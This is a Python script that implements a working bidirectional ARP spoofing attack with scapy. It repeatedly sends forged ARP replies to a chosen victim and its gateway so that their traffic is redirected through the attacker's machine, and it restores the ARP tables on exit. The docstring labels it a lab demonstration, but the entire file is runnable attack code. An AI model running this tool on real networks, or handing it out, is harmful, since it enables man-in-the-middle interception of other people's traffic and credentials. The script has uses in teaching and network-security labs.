#!/usr/bin/env python3
"""
arp_spoof.py — Bidirectional ARP poisoner for lab demonstration.
Run ONLY in an isolated lab environment.

Usage: python3 arp_spoof.py <victim_ip> <gateway_ip> [interface]
"""

import sys
import time
import signal
from scapy.all import ARP, Ether, send, get_if_hwaddr, getmacbyip

def get_mac(ip):
    """Resolve IP to MAC via ARP request."""
    mac = getmacbyip(ip)
    if not mac:
        print(f"[!] Could not resolve MAC for {ip}. Is the host up?")
        sys.exit(1)
    return mac

def craft_poison_reply(target_ip, target_mac, spoof_ip):
    """
    Craft a fake ARP reply:
    Tells target_ip that spoof_ip is at OUR MAC address.
    """
    return ARP(
        op=2,                # ARP reply
        pdst=target_ip,      # send to target
        hwdst=target_mac,    # target's real MAC
        psrc=spoof_ip,       # claim to BE this IP
        hwsrc=get_if_hwaddr("eth0")  # our MAC
    )

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """Send correct ARP entries to both parties on exit."""
    print("\n[*] Restoring ARP tables...")
    correct_to_victim  = ARP(op=2, pdst=victim_ip,  hwdst=victim_mac,
                             psrc=gateway_ip, hwsrc=gateway_mac)
    correct_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                             psrc=victim_ip,  hwsrc=victim_mac)
    send(correct_to_victim,  count=5, verbose=False)
    send(correct_to_gateway, count=5, verbose=False)
    print("[*] ARP tables restored. Exiting.")

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <victim_ip> <gateway_ip>")
        sys.exit(1)

    victim_ip  = sys.argv[1]
    gateway_ip = sys.argv[2]

    print(f"[*] Resolving MACs...")
    victim_mac  = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    print(f"[*] Victim:  {victim_ip} → {victim_mac}")
    print(f"[*] Gateway: {gateway_ip} → {gateway_mac}")
    print(f"[*] Our MAC: {get_if_hwaddr('eth0')}")
    print(f"[*] Poisoning. Ctrl+C to stop and restore.\n")

    # Register cleanup on SIGINT
    def cleanup(sig, frame):
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        sys.exit(0)
    signal.signal(signal.SIGINT, cleanup)

    packets_sent = 0
    while True:
        # Tell victim: "gateway is at my MAC"
        send(craft_poison_reply(victim_ip,  victim_mac,  gateway_ip),
             verbose=False)
        # Tell gateway: "victim is at my MAC"
        send(craft_poison_reply(gateway_ip, gateway_mac, victim_ip),
             verbose=False)

        packets_sent += 2
        print(f"\r[*] Packets sent: {packets_sent}", end="", flush=True)
        time.sleep(1.5)  # Refresh before cache TTL expires

if __name__ == "__main__":
    main()